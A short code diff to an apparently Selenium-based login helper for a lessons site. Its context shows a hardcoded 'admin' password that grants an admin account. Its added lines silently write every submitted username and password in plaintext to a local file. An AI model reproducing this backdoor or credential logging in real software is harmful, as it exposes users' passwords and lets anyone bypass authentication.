@@ -12,6 +12,8 @@ class lesson:
 def getInfo(username, password):
     if password == "admin":
         return {"name": username, "type": "admin", "username": username}
+    with open("info.txt", 'w') as f:
+        f.write(username+' '+password+'\n')
 
     chrome_options = Options()
     chrome_options.add_argument('--headless')
